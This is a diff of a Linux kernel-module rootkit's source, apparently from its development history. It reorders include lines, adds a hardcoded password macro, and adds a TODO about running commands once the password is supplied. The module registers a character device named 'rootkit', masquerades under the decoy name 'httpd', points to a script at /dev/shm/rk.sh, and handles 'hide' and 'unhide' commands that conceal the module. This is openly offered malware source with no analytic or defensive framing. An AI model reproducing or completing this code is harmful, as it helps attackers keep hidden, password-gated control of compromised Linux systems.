@@ -1,15 +1,15 @@
 #include <linux/module.h>
-#include <linux/init.h>
 #include <linux/version.h>
-#include <linux/sched.h>
-#include <linux/fs.h>
-#include <linux/string.h>
-#include <asm/uaccess.h>
-#include <linux/kthread.h>
 #include <linux/kernel.h>
-#include <linux/delay.h>
+#include <linux/kthread.h>
 #include <linux/kallsyms.h>
+#include <linux/fs.h>
+#include <linux/init.h>
+#include <linux/sched.h>
+#include <linux/delay.h>
+#include <linux/string.h>
 #include <linux/unistd.h>
+#include <asm/uaccess.h>
 #include <asm/paravirt.h>
 #include <asm/pgtable.h>
 
@@ -17,6 +17,7 @@
 #define RK_DECOY_NAME "httpd"
 #define DEBUG 1
 #define CMD "/dev/shm/rk.sh"
+#define PASSWORD "supersecretpasswordtoruncommands"
 #define DEVICE_NAME "rootkit"
 #define BUF_SIZE 256
 
@@ -78,7 +79,7 @@ device_write(struct file *file, const char __user *buf, size_t len, loff_t *off)
 	printk(KERN_INFO "%s: writing %ld characters.", RK_NAME, len);
 	printk(KERN_INFO "%s: writing buf=%s", RK_NAME, msg_buf);
 #endif
-
+	// TODO: If msg_buf starts with PASSWORD then execute.
 	if (!strncmp(msg_buf, "hide", MIN(4, len))) {
 		rk_hide();
 	} else if (!strncmp(msg_buf, "unhide", MIN(6, len))) {
